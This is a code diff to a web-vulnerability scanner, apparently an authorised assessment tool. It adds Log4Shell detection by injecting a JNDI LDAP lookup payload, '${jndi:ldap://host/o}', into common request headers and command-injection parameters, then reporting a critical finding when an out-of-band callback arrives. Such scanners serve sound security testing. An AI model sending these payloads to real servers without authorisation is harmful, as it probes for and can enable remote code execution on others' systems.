@@ -161,6 +161,15 @@ def _class_params(inventory, cls):
     return out
 
 
+_L4J_HEADERS = ("User-Agent", "Referer", "X-Api-Version", "X-Forwarded-For",
+                "X-Client-IP", "X-Requested-With")
+
+
+def _log4shell_payload(host: str) -> str:
+    """Log4Shell (CVE-2021-44228) JNDI lookup — a DNS/LDAP callback to `host` is proof."""
+    return "${jndi:ldap://" + host + "/o}"
+
+
 def _cmd_payloads(url):
     """OS-command / template-injection payloads that fetch our callback URL over HTTP
     (works for both interactsh and the tunnel)."""
@@ -266,6 +275,35 @@ def oast_scan(assessment_id, inventory, sandbox, session_headers, cfg,
                 pass
         pending.append({"token": tok, "kind": "sqli", **t})
 
+    # Log4Shell / JNDI (CVE-2021-44228): header-based on discovered endpoints (the usual
+    # vector is a logged header) + param-based on command sinks. A DNS/LDAP callback proves it.
+    _hdr_urls, _seen_u = [], set()
+    for it in inventory or []:
+        u = it.get("url")
+        if u and (it.get("method") or "GET").upper() == "GET" and u not in _seen_u:
+            _seen_u.add(u)
+            _hdr_urls.append(u)
+        if len(_hdr_urls) >= 8:
+            break
+    for u in _hdr_urls:
+        tok = "owl" + _secrets.token_hex(4)
+        pl = _log4shell_payload(sess.host(tok))
+        try:
+            h = {**(session_headers or {}), **{hn: pl for hn in _L4J_HEADERS}}
+            sandbox.http_request("GET", u, headers=h)
+        except Exception:
+            pass
+        pending.append({"token": tok, "kind": "log4shell", "url": u, "method": "GET",
+                        "param": "(header)"})
+    for t in cmd_t[:6]:
+        tok = "owl" + _secrets.token_hex(4)
+        try:
+            _send(sandbox, t["method"], t["url"], t["param"],
+                  _log4shell_payload(sess.host(tok)), session_headers)
+        except Exception:
+            pass
+        pending.append({"token": tok, "kind": "log4shell", **t})
+
     log(f"oast: injected {len(pending)} callback payload(s) via {sess.source}; "
         f"waiting {cfg.wait_seconds}s")
     time.sleep(max(3, int(getattr(cfg, "wait_seconds", 12))))
@@ -291,6 +329,15 @@ def oast_scan(assessment_id, inventory, sandbox, session_headers, cfg,
                     analysis=(f"An XML external entity posted to {p['url']} made the parser fetch "
                               f"{cbk} (out-of-band confirmation of XXE)."),
                     poc=f"XML external entity -> callback to {cbk}", status="validated", note=note)
+            elif p["kind"] == "log4shell":
+                _file_finding(assessment_id,
+                    title="Log4Shell / JNDI injection (CVE-2021-44228, RCE)",
+                    severity="critical", endpoint=p["url"], method=p["method"],
+                    analysis=(f"A JNDI lookup injected via {p['param']} on {p['url']} made the "
+                              f"server resolve/connect to {cbk} (out-of-band confirmation of a "
+                              "Log4Shell-class JNDI injection — likely remote code execution)."),
+                    poc=f"{p['param']} = " + "${jndi:ldap://" + cbk + "/o} -> server-side callback",
+                    status="validated", note=note)
             elif p["kind"] == "cmd":
                 _file_finding(assessment_id,
                     title=f"Blind OS command / template injection via '{p['param']}'",
